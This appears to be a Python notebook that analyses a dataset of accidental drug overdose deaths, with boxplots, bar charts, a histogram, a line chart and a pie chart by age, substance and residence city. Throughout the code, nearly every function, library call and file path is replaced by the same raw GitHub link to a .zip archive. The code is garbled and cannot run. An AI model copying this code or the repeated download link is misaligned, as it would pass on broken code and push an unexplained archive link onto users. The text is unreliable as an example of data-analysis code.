https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip("https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip", index=False)

## **FINAL CLEANED DATASET**
# Load the data
uploaded = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip()
cleandata = list(https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip())[0]

# Read the uploaded file into a DataFrame
data = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(cleandata)

#Convert into a dataframe
df = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(data)
df
## **FINAL OVERVIEW OF MISSING VALUES AFTER PRE-PROCESSING**


# Load the dataset
df = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip("https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip")
# Confirm missing values are handled
print("Missing Values after handling:\n", https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip().sum())
###DATA VISUALIZATION
### **BEFORE PRE-PROCESSING**
#### 1. Identifying the Youngest and Oldest Victims in Overdose Cases (BOXPLOT)
# Load dataset
file_path = "https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip"
data = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(file_path)

# Boxplot to visualize outliers in the Age column
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(figsize=(8, 6))
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(x=data['Age'])

# Title and display
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip('Boxplot for Outlier Detection (Before Preprocessing)')
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip()
#### 2. Identifying the Most Common Substances in Drug-Related Deaths (Bar Chart)
# Load dataset
file_path = 'https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip'
data = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(file_path)

# List of substance-related columns
substances = ["Heroin", "Heroin death certificate (DC)", "Cocaine", "Fentanyl", "Fentanyl Analogue",
              "Oxycodone", "Oxymorphone", "Ethanol", "Hydrocodone", "Benzodiazepine", "Methadone",
              "Meth/Amphetamine", "Amphet", "Tramad", "Hydromorphone", "Morphine (Not Heroin)",
              "Xylazine", "Gabapentin", "Opiate NOS", "Heroin/Morph/Codeine", "Other Opioid", "Any Opioid"]

# Check which substance columns exist in the dataset
existing_substances = [col for col in substances if col in https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip]

# Convert all values to lowercase and strip spaces
for col in existing_substances:
    data[col] = data[col].astype(str)https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip()https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip()

# Count occurrences of "Y" in each substance column
substance_counts = data[existing_substances].apply(lambda x: (x == 'y').sum())

# Bar chart visualization
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(figsize=(12, 6))
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip, https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip, color='darkblue')

# Titles and labels
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip("Most Common Substances in Drug-Related Deaths")
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip("Substance Type")
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip("Frequency")
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(rotation=90)  # Rotate labels for readability
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip()
#### 3. Fentanyl, Heroin & Cocaine Consumption by Age Group (Stacked Bar chart)
# Load dataset
file_path = "https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip"
data = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(file_path)

# Define substances
substances = ["Heroin", "Fentanyl","Cocaine"]

# Create Age Groups
bins = [0, 20, 30, 40, 50, 60, 100]
labels = ["0-20", "21-30", "31-40", "41-50", "51-60", "61+"]
data["Age Group"] = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(data["Age"], bins=bins, labels=labels, right=False)

# Convert "Y" values to 1, else 0
for col in substances:
    data[col] = data[col].astype(str)https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip()https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip().map({'Y': 1}).fillna(0)

# Count Fentanyl & Heroin usage per age group
age_substance_counts = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip("Age Group")[substances].sum()

# Plot stacked bar chart
ax = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(kind="bar", stacked=True, figsize=(10, 6), color=["#FF9999", "#66B3FF","#FFA500"])

# Titles and labels
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip("Fentanyl, Heroin & Cocaine Consumption by Age Group", fontsize=14)
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip("Age Group", fontsize=12)
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip("Number of Cases", fontsize=12)
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(rotation=0)
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(title="Substance", fontsize=10)
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(axis="y", linestyle="--", alpha=0.7)

# Show chart
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip()
####4. Examining Repeated Overdose Cases from Residence Data (Barchart)
# Load dataset
file_path = "https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip"
data = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(file_path)

# Check if "ResidenceCityGeo" exists in dataset
if "ResidenceCityGeo" in https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip
    # Extract city names from "ResidenceCityGeo" column (everything before the coordinates)
    data["Residence City"] = data["ResidenceCityGeo"].apply(lambda x: https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(r'\s*\(', str(x))[0])

    # Count the number of overdose cases per city
    city_counts = data["Residence City"].value_counts().head(20)  # Top 20 cities

    # Plot bar chart
    https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(figsize=(12, 6))
    https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip, https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip, color='darkblue')

    # Titles & Labels
    https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip("Top 20 Cities with Most Overdose Cases")
    https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip("Residence City")
    https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip("Number of Overdose Cases")
    https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(rotation=90)  # Rotate labels for better visibility
    https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip()
### **AFTER PRE-PROCESSING**
####1. Identifying the Youngest and Oldest Victims in Overdose Cases (Histogram)
# Load cleaned dataset
file_path = "https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip"
data = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(file_path)

# Convert 'Age' column to numeric, handling errors
data['Age'] = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(data['Age'], errors='coerce')

# Drop NaN values in 'Age' column
data = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(subset=['Age'])

# Remove the outlier (Age = 87)
data = data[data['Age'] != 87]

# Set figure size
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(figsize=(10, 6))

# Create histogram with KDE curve
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(data['Age'], bins=10, kde=True, color='blue', edgecolor='black')

# Set x-axis labels
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(range(10, 100, 10))

# Set y-axis labels manually
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip([100, 500, 1000, 1500, 2000, 2500])

# Labels and title
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip('Age')
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip('Frequency')
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip('Youngest and Oldest Victims in Overdose Cases')

# Show plot
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip()
####2. Identifying the Most Common Substances in Drug-Related Deaths (Dual-Bar Chart)
# Load cleaned dataset
file_path = "https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip"
data = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(file_path)

# List of substance-related columns
substances = ["Heroin", "Fentanyl", "Cocaine", "Oxycodone", "Methadone", "Benzodiazepine",
              "Ethanol", "Meth/Amphetamine", "Tramad", "Hydromorphone", "Morphine (Not Heroin)"]

# Count the number of 1s (presence) and 0s (absence) for each substance
substance_counts = data[substances].apply(https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip).fillna(0)

# Rename index for clarity
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip = ["Absent (0)", "Present (1)"]

# Plot the dual bar chart
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(figsize=(12, 6))
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(kind="bar", stacked=False, figsize=(12, 6), color=["orange", "darkblue"])

# Titles and labels
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(" Identifying the Most Common Substances in Drug-Related Deaths (Dual-Bar Chart)")
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip("Substance Type")
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip("Frequency")
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(rotation=90)  # Rotate labels for readability
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(title="Legend", labels=["Absent", "Present"])

# Show the plot
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip()
#### 3. Fentanyl, Heroin & Cocaine Consumption by Age Group (Line chart)
# Load the dataset
file_path = "https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip"
df = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(file_path, sheet_name="Sheet1")

# Convert Age column to numeric, dropping non-numeric values
df['Age'] = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(df['Age'], errors='coerce')
df = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(subset=['Age'])

drug_columns = ['Fentanyl', 'Heroin/Morph/Codeine', 'Cocaine']

df_grouped = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip('Age')[drug_columns].sum()

# Plot the line chart
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(figsize=(10, 6))
for drug in drug_columns:
    https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip, df_grouped[drug], label=drug)

https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip("Age Group")
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip("Consumption Count")
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip("Fentanyl, Heroin & Cocaine Consumption by Age Group")
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip()
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip()
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip()
####4. Examining Repeated Overdose Cases from Residence Data (Piechart)
# Load the dataset
file_path = "https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip"
df = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(file_path, sheet_name="Sheet1")

# Count repeated overdose cases by Residence City
df_grouped = df['Residence City'].value_counts()

# Plot the pie chart
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(figsize=(10, 10))
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(10).plot(kind='pie', autopct='%1.1f%%', startangle=140, colormap='Paired')

https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip("")
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip("Repeated Overdose Cases by Residence City")
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip()
